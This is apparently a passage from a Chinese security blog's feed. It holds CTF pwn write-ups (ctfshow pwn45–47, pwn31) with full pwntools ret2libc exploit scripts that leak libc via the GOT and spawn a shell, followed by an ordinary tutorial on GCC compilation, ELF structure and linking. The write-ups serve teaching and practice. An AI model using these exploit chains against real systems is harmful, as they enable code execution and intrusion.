要写入的字节数。即从缓冲区中读取并写入目标位置的字节数。如果指定的字节数超过了缓冲区的实际大小，可能会导致未定义行为或部分数据丢失。</p></li><li><p><strong>返回值</strong>: 成功时返回实际写入的字节数；失败时返回 -1，并设置相应的错误码（如 <code>errno</code>）。需要注意的是，即使成功了也不一定保证所有请求的字节都被写入了，特别是在非阻塞模式下或者遇到信号中断的情况下可能只写了部分数据。在这种情况下需要检查返回值并与预期的字节数进行比较以决定是否需要重试操作直到全部完成为止;user:详细讲讲python中的write方法</p></li></ul><p>puts版</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28217</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">main=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6B</span>+<span class="number">4</span>)+p32(puts_plt)+p32(main)+p32(puts_got)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;O.o?&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">puts=u32(io.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts)</span><br><span class="line"></span><br><span class="line">libc_base=puts-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6B</span>+<span class="number">4</span>)+p32(system)+p32(<span class="number">0</span>)+p32(bin_sh)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="pwn46"><a href="#pwn46" class="headerlink" title="pwn46"></a>pwn46</h4><p>该题于上一题类似只是换成了64位程序，传参方式改变接收地址的形式也有所变化</p><p>64位传参寄存器：rdi,rsi,rdx,rcx,r8,r9</p><p>puts版：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28276</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">vuln=elf.symbols[<span class="string">&#x27;ctfshow&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi_ret=<span class="number">0x400803</span></span><br><span class="line">ret=<span class="number">0x4004fe</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x70</span>+<span class="number">8</span>)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(vuln)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">puts=u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#这段代码的作用是从输入流中读取数据，直到遇到字节 \x7f，然后提取最后6个字节，并用 \x00 填充到8个字节的长度。最终的结果是一个长度为8的字节串。</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts)</span><br><span class="line"></span><br><span class="line">libc_base=puts-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x70</span>+<span class="number">8</span>)+p64(ret)+p64(pop_rdi_ret)+p64(bin_sh)+p64(system)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>write版：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28218</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">pop_rdi=<span class="number">0x400803</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x400801</span></span><br><span class="line"><span class="comment">#在搜索pop_rsi时只有pop_rsi_r15故后续需要给r15一个任意值</span></span><br><span class="line">payload = cyclic(<span class="number">0x70</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi_r15)+p64(write_got)+p64(<span class="number">0</span>)<span class="comment">#垃圾数据0填入r15保证程序正常运行</span></span><br><span class="line">payload += p64(write_plt)</span><br><span class="line">payload += p64(main)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;O.o?&quot;</span>,payload)</span><br><span class="line">write=u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write)</span><br><span class="line">libc_base = write-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system = libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=cyclic(<span class="number">0x70</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(bin_sh)+p64(system)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;O.o?&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="pwn47"><a href="#pwn47" class="headerlink" title="pwn47"></a>pwn47</h4><p>程序中已给出多个地址，接收即可、</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">io=remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28215</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;puts: &quot;</span>)</span><br><span class="line">puts = <span class="built_in">eval</span>(io.recvuntil(<span class="string">&quot;\n&quot;</span>,drop = <span class="literal">True</span>))</span><br><span class="line"><span class="comment">#drop = True表示不接收检测字符&quot;\n&quot;,recvuntil(&quot;\n&quot;)表示接收字符直到检测到&quot;\n&quot;为止</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;gift: &quot;</span>)</span><br><span class="line">bin_sh = <span class="built_in">eval</span>(io.recvuntil(<span class="string">&quot;\n&quot;</span>,drop = <span class="literal">True</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>,puts)</span><br><span class="line">libc_base = puts-libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line">system = libc_base+libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x9c</span>+<span class="number">4</span>)+p32(system)+p32(<span class="number">0</span>)+p32(bin_sh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="pwn31"><a href="#pwn31" class="headerlink" title="pwn31"></a>pwn31</h4><p><strong>got表的首地址存在ebx中</strong></p><p><img src="/../images/ret2libc/gdb.png" alt="1"></p><p>所以该题需要设定ebx的值使得got表上的地址能够正常识别</p><p>checksec</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">桌面$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/桌面/pwn&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>没开canary开了PIE</p><p>main函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, main);</span><br><span class="line">  (ctfshow)(&amp;argc);</span><br><span class="line">  ......</span><br></pre></td></tr></table></figure><p>开始会给main函数的地址可以接收了来获取elf基地址</p><p>ctfshow函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">132</span>]; <span class="comment">// [esp+0h] [ebp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在栈溢出，可以通过此处泄露libc构造二次输入再system(‘&#x2F;bin&#x2F;sh’)</p><p>看汇编可以发现在ctfshow函数中调用完read后会改动ebx的值而我们通过got表索引函数时ebx是存有got表的首地址的所以此处改变了就会导致后续无法正常索引</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:00000644                 call    _read</span><br><span class="line">.text:00000649                 add     esp, 10h</span><br><span class="line">.text:0000064C                 nop</span><br><span class="line">.text:0000064D                 mov     ebx, [ebp+var_4]</span><br><span class="line">.text:00000650                 leave</span><br><span class="line">.text:00000651                 retn</span><br></pre></td></tr></table></figure><p>var_4 &#x3D; -4所以要在ebp-4的地方放置got表首地址</p><p>libc版本：<a href="https://libc.blukat.me/?q=puts:360&l=libc6-i386_2.27-3ubuntu1_amd64">libc database search</a></p><p>完整exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./1.so&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28153</span>)</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x652</span></span><br><span class="line"></span><br><span class="line">elf_base=<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>) - main</span><br><span class="line">info(<span class="string">&#x27;elf_base:&#x27;</span>+<span class="built_in">hex</span>(elf_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">puts_plt = elf_base + <span class="number">0x490</span></span><br><span class="line">puts_got = elf_base + <span class="number">0x1FD4</span></span><br><span class="line"></span><br><span class="line">ctfshow = elf_base + <span class="number">0x61D</span></span><br><span class="line">ebx = elf_base + <span class="number">0x1FC0</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">132</span> + p32(ebx)+ <span class="string">b&quot;aaaa&quot;</span> + p32(puts_plt) + p32(ctfshow) + p32(puts_got)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr=u32(io.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line">info(<span class="string">&#x27;puts_addr:&#x27;</span>+<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"> </span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>) + p32(system) + p32(<span class="number">0</span>) + p32(bin_sh)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> 栈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基础学习</title>
      <link href="/2024/11/19/%E6%8C%87%E5%8D%97%E6%91%98%E8%A6%81/"/>
      <url>/2024/11/19/%E6%8C%87%E5%8D%97%E6%91%98%E8%A6%81/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><p>建立学习参考目标</p><p>（1）短期参考比自己优秀的同龄人。阅读他们的文章和工作成果从细节中观察他们的学习方 式和工作方式。</p><p>（2）中期参考你的方向上的业内专家。了解他们的成长轨迹’跟踪他们关注的内容。 </p><p>（3）长期参考业内老牌企业和先锋企业把握行业发展、技术趋势’为未来做积累</p><h1 id="二进制文件"><a href="#二进制文件" class="headerlink" title="二进制文件"></a>二进制文件</h1><h2 id="从源代码到可执行文件"><a href="#从源代码到可执行文件" class="headerlink" title="从源代码到可执行文件"></a>从源代码到可执行文件</h2><h3 id="编译原理"><a href="#编译原理" class="headerlink" title="编译原理"></a>编译原理</h3><p>编译器的作用是读人以某种语言（源语言）编写的程序，输出等价的用另一种语言（目标语言） 编写的程序。</p><p> <img src="/../images/ZN/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86.png" alt="编译原理"></p><h3 id="GCC编译"><a href="#GCC编译" class="headerlink" title="GCC编译"></a>GCC编译</h3><p>GCC编译主要包括四个阶段：预处理、编译、汇编、链接。*(-o 选项用于指定编译后生成的输出文件名)*</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc hello.c -o hello <span class="comment">//终端运行即可获得可执行文件hello</span></span><br></pre></td></tr></table></figure><p>hello.c–&gt;hello.s–&gt;hello.o</p><h4 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h4><p>将#开头的预处理指令转换后直接插入程序文本中，得到另一个c程序 hello.i</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -E hello.c -o hello.i <span class="comment">//-E可以单独执行预处理</span></span><br></pre></td></tr></table></figure><p>预处理的一些处理规则如下：</p><ul><li>递归处理＃include预处理指令将对应文件的内容复制到该指令的位置; </li><li>删除所有的#define指令并且在其被引用的位置递归地展开所有的宏定义; </li><li>处理所有条件预处理指令:#if #ifdef 等;</li><li>删除所有注释; </li><li>添加行号利文件名标识;</li></ul><h4 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h4><p>将hello.c或hello.i变为汇编代码（实际上GCC已经将预处理和编译合并处理）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -S hello.c -o hello.s</span><br><span class="line">gcc -S hello.i -o hello.s</span><br></pre></td></tr></table></figure><h4 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h4><p>汇编器将汇编代码转换为机器码，即将hello.s汇编为hello.o目标文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c hello.c -o hello.o</span><br><span class="line">gcc -c hello.s -o hello.o</span><br></pre></td></tr></table></figure><p>此时的hello.o是一个可重定位文件，可以使用objdump命令来查看其内容</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file hello.o <span class="comment">//查看文件类型</span></span><br><span class="line"><span class="comment">//hello.o: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), not stripped</span></span><br></pre></td></tr></table></figure><ul><li><strong>ELF</strong>：表示这是一个可执行与链接格式（Executable and Linkable Format）的文件。这是一种广泛用于Unix系统的标准文件格式。</li><li><strong>64-bit</strong>：说明这个文件是为64位架构设计的。</li><li><strong>LSB</strong>：代表小端字节序（Little Endian Byte Order），这是数据存储的一种方式，在这种模式下，较低有效位的数据存放在内存的低地址处。</li><li><strong>relocatable</strong>：表明这是一个目标文件（object file），它可以被链接器用来创建一个可执行文件或另一个目标文件。</li><li><strong>x86-64</strong>：指明该文件适用于x86_64架构，也就是我们常说的AMD64或Intel 64架构。</li><li>**version 1 (SYSV)**：指的是这个ELF文件遵循的是System V ABI版本1规范。</li><li><strong>not stripped</strong>：意味着调试信息和其他元数据没有从这个目标文件中移除。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -sd hello.o -M intel <span class="comment">//查看文件内容</span></span><br></pre></td></tr></table></figure><h4 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h4><p>链接可分为静态链接和动态链接两种，gcc默认使用动态链接，添加编译选项 -stdtic 即可指定使用静态链接。这一阶段将目标文件及其依赖库进行链接，生成可执行文件，主要包括地址和空间分配、符号绑定和重定位等操作。</p><p><em>(依赖库是指在软件项目中，为了实现某些功能而需要的外部代码库或组件）</em></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc hello.o -o hello -<span class="type">static</span></span><br></pre></td></tr></table></figure><p>链接操作由链接器（ld.so）完成，结果就得到了hello文件，这是一个静态链接的可执行文件，其包含了大量的库文件。</p><p>通过链接操作，对象文件中无法确定的符号地址已经被修正为实际的符号地址，程序也就可以被加载到内存中正常执行了。</p><h2 id="ELF文件的结构"><a href="#ELF文件的结构" class="headerlink" title="ELF文件的结构"></a>ELF文件的结构</h2><p>当提到目标文件时，即指各种类型的ELF文件。对于 .o 文件，我们则可直接称为可重定向文件。</p><p>在审视一个目标文件时，有两种视角可供选择，一种是链接视角，通过节（Section）来划分；另一种是运行视角，通过段（Segment）来进行划分。</p><h3 id="链接视角"><a href="#链接视角" class="headerlink" title="链接视角"></a>链接视角</h3><h4 id="三个节"><a href="#三个节" class="headerlink" title="三个节"></a>三个节</h4><p>通常目标文件都会包含代码（.text）、数据（.data）和BSS（.bss）三个节。</p><ul><li>代码节用于保存可执行的机器指令</li><li>数据节用于保存<strong>已初始化</strong>的全局变量和局部静态变量</li><li>BSS节则用于保存<strong>未初始化</strong>的全局变量和局部静态变量</li></ul><p>除了上边的三个节，简化的目标文件还应包含一个文件头（ELF header)</p><p>将程序指令和程序数据分开存放，从安全的角度讲，当程序被加载后，数据和指令分别被映射到两个虚拟区域。由于数据区域对于进程来说是可读写的，而指令区域对于进程来说是只读的，所以这两个虚存区域的权限可以被分别设置成可读写和只读，防止程序的指令被改写和利用。</p><h4 id="ELF文件头（没学透）"><a href="#ELF文件头（没学透）" class="headerlink" title="ELF文件头（没学透）"></a>ELF文件头（没学透）</h4><p>位于目标文件最开始的位置，包含描述整个文件的一些基本信息，例如：ELF文件类型、版本&#x2F;ABI版本<em>（指的是应用程序二进制接口的版本）</em>、目标机器、程序入口、段表和节表的位置和长度等。</p><p>值得注意的 是文件头部存在魔术字符（7f 45 4c 46）,即字符串 \177ELF 当文件被映射到内存时，可以通过搜索该字符确定映射地址这在dump内存时非常有用。</p><blockquote><p>Dump内存指的是将程序运行时的内存状态导出到文件中的过程。这个操作通常用于调试和分析程序的行为，尤其是在出现崩溃或异常时。通过查看dump出来的内存数据，开发者可以了解程序在特定时刻的状态，包括：</p><ol><li>变量的值：检查各个变量是否包含预期的数据。</li><li>调用栈：确定导致问题的函数调用序列。</li><li>注册信息：CPU寄存器的内容，有助于追踪执行流程。</li><li>内存泄漏：查找未释放的资源。</li></ol></blockquote><h4 id="节头表"><a href="#节头表" class="headerlink" title="节头表"></a>节头表</h4><p>一个目标文件中包含许多节，这些节的信息保存在节头表中，表的每一项都是一个Elf64_Shdr结构体，记录了节的名字、长度、偏移、读写权限等信息。 </p><p><strong>字符串表</strong>中包含了以null结尾的字符序列，用来表示符号名和节名，引用字符串时只需给出字符序列在表中的偏移即可。字符串表的第一个字符和最后一个字符都是null字符，以确保所有字符串的开始和终止。</p><p><strong>符号表</strong>记录了目标文件中所用到的所有符号信息，通常分为.dynsym和.symtab，前者是后者的子集。.dynsym保存了引用自外部文件的符号，只能在运行时被解析，而.symtab还保存了本地符号，用于调试和链接。目标文件通过一个符号在表中的索引值来使用该符号。索引值从0开始计数，但值为0的表项不具有实际的意义，它表示未定义的符号。每个符号都有一个符号值，对于变量和函数，该值就是符号的地址。</p><p><strong>重定位</strong>是连接符号定义与符号引用的过程。可重定位文件在构建可执行文件或共享目标文件时，需要把节中的符号引用换成这些符号在进程空间中的虚拟地址。包含这些转换信息的数据就是重定位项。</p><h3 id="运行视角and可执行文件的装载（学了结构体再来看）"><a href="#运行视角and可执行文件的装载（学了结构体再来看）" class="headerlink" title="运行视角and可执行文件的装载（学了结构体再来看）"></a>运行视角and可执行文件的装载（学了结构体再来看）</h3><p>当运行一个可执行文件时，首先需要将该文件和动态链接库装载到进程空间中，形成一个进程镜像。每个进程都拥有独立的虚拟地址空间，这个空间如何布局是由记录在段头表中的程序头决定的。</p><p>通常一个可执行文件至少有一个PT_LOAD类型的段，用于描述可装载的节，而动态链接的可执行文件则包含两个，将.data和.text分开存放。动态段PT_DYNAMIC包含了一些动态链接器所必须的信息，如共享库列表，GOT表和重定位表等。</p><h2 id="静态链接"><a href="#静态链接" class="headerlink" title="静态链接"></a>静态链接</h2><h3 id="地址空间分配"><a href="#地址空间分配" class="headerlink" title="地址空间分配"></a>地址空间分配</h3><blockquote><p>该部分讲述两个或多个不同的目标文件是如何组成一个可执行文件的</p></blockquote><p>要想将两个或多个不同的目标文件组合在一起成一个可执行文件需要进行<strong>链接</strong></p><p>链接由链接器完成，根据发生的时间不同，可分为编译时链接、加载时链接和运行时链接</p><p>现给出main.c和fun.c两个目标文件，将这目标文件链接成一个可执行文件有两种方案：</p><ol><li><p>按序叠加：弊端是如果参与链接的目标文件过多，那么暑促的可执行文件会非常零散，而段的装载地址和空间以页为单位对齐，不足一页的代码节或数据节也要占用一页，这样就造成了内存空间的浪费</p></li><li><p>相似合并：将不同目标文件相同属性的节合并为一个节。这种方案被当前的链接器所采用，首先对各个节的长度、属性和偏移进行分析，然后将输入目标文件中的符号表的符号定义与符号引用统一生成全局符号表，最后读取输入文件的各类信息对符号进行解析、重定位等操作。<strong>相似节的合并就发生在重定位时。完成后，程序中的每条指令和全局变量就都有唯一的运行时内存地址了。</strong></p><p><img src="/../images/ZN/%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B.png" alt="链接过程"></p></li></ol><h3 id="静态链接详细过程"><a href="#静态链接详细过程" class="headerlink" title="静态链接详细过程"></a>静态链接详细过程</h3><p>该部分准备了main.c和fun.c两个程序分别如下</p><p>链接两个程序并生成中间文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -static -fno-stack-protector main.c fun.c -save-temps --verbose -o 